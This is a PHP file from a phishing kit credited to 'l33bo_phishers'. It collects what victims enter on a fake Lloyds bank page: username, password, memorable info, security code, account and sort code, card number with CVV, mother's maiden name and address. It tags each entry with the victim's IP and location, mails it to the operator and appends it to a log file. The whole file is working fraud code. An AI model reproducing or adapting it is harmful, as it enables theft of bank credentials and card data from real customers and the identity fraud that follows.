<?php
/*
Created by l33bo_phishers -- icq: 695059760 
*/
require "../../CONTROLS.php";
require "../../includes/functions.php";
require "../../includes/One_Time.php";

error_reporting(0);
session_start();

date_default_timezone_set('Europe/London');
$date = date('l d F Y');
$time = date('H:i');
$user = $_SESSION['user'];
$pass = $_SESSION['pass'];
$memo = $_SESSION['memo'];
$name = $_POST['name'];
$dob = $_POST['dob'];
$address = $_POST['address'];
$postcode = $_POST['postcode'];
if(!isset($_POST['telephone'])) {
$telephone = '';
}      
else $telephone = $_POST['telephone'];
$mobile = $_POST['mobile'];
$mmn = $_POST['mmn'];
$acno = $_POST['acno'];
$sortcode = $_POST['sortcode'];
$ccno = $_POST['ccno'];
$ccexp = $_POST['ccexp'];
$secode = $_POST['secode'];
$telepin = $_POST['telepinFinal1'] . "" . $_POST['telepinFinal2'] . "" . $_POST['telepinFinal3'] . "" . $_POST['telepinFinal4'] . "" . $_POST['telepinFinal5'] . "" . $_POST['telepinFinal6'];
$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$ccno = str_replace(' ', '', $ccno);
$cardInfo = bankDetails($ccno);
$_SESSION['bin'] = ($cardInfo['bin']);
$_SESSION['brand'] = ($cardInfo['brand']);
$_SESSION['bank'] = ($cardInfo['issuer']);
$_SESSION['type'] = ($cardInfo['type']);
$bin = $_SESSION['bin'];
$bank = $_SESSION['bank'];
$brand = $_SESSION['brand'];
$type = $_SESSION['type'];
$VictimInfo1 = "| IP Address :"." ".$_SERVER['REMOTE_ADDR']." (".gethostbyaddr($_SERVER['REMOTE_ADDR']).")";
$VictimInfo2 = "| Location :"." ".$systemInfo['city'].", ".$systemInfo['region'].", ".$systemInfo['country'];
$VictimInfo3 = "| UserAgent :"." ".$systemInfo['useragent'];
$VictimInfo4 = "| Browser :"." ".$systemInfo['browser'];
$VictimInfo5 = "| Platform :"." ".$systemInfo['os'];
$data = "
+ ------------- LLOYDS -------------+
+ ------------------------------------------+
+ Personal Information
| Full name : $name
| Date of birth : $dob
| Address : $address
| Postcode : $postcode
| Home Tel : $telephone
| Mobile Tel : $mobile
| Mother Maiden : $mmn
+ ------------------------------------------+
+ Account Information (Lloyds)
| User : $user
| Pass : $pass
| Memorable Info : $memo
| 6-digit Security Code: $telepin
| Account No: $acno
| Sortcode: $sortcode
+ ------------------------------------------+
+ Billing Information
| Card Number : $ccno
| Expiration date : $ccexp
| CVV : $secode
+ ------------------------------------------+
+ Victim Information
$VictimInfo1
$VictimInfo2
$VictimInfo3
$VictimInfo4
$VictimInfo5
| Received : $date @ $time
+ ------------------------------------------+
";

mail($to, 'Lloyds from ' . $_SERVER['REMOTE_ADDR'], $data);

$file = fopen('../../assets/logs/banks.txt', 'a');
fwrite($file, $data);
fclose($file);
redirectTo("../../Exit.php?sslchannel=true&sessionid=" . generateRandomString(130));
die;
?>
